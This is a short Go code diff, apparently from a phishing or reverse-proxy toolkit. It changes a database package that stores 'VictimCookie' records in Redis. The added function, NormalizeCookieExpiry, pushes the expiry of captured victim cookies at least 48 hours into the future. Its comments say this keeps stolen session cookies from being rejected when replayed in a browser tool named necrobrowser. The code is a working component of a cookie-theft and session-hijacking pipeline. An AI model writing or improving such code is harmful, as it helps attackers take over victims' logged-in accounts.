@@ -2,6 +2,7 @@ package db
 
 import (
 	"fmt"
+	"time"
 
 	"github.com/gomodule/redigo/redis"
 
@@ -49,6 +50,18 @@ type VictimCookie struct {
 	Secure   bool   `redis:"secure" json:"secure"`
 	SameSite string `redis:"sameSite" json:"sameSite"`
 	Session  bool   `redis:"session" json:"session"` // is the cookie a session cookie?
+}
+
+// NormalizeCookieExpiry ensures cookie expiry is at least 48 hours in the future.
+// Session cookies (no explicit Expires) produce Go's zero time, which converts to a
+// negative Unix timestamp and gets rejected by browsers/necrobrowser. This function
+// guarantees a usable future expiry in all cases.
+func NormalizeCookieExpiry(expires time.Time) time.Time {
+	minExpiry := time.Now().Add(48 * time.Hour)
+	if expires.IsZero() || expires.Before(minExpiry) {
+		return minExpiry
+	}
+	return expires
 }
 
 // Store saves a Victim in the database
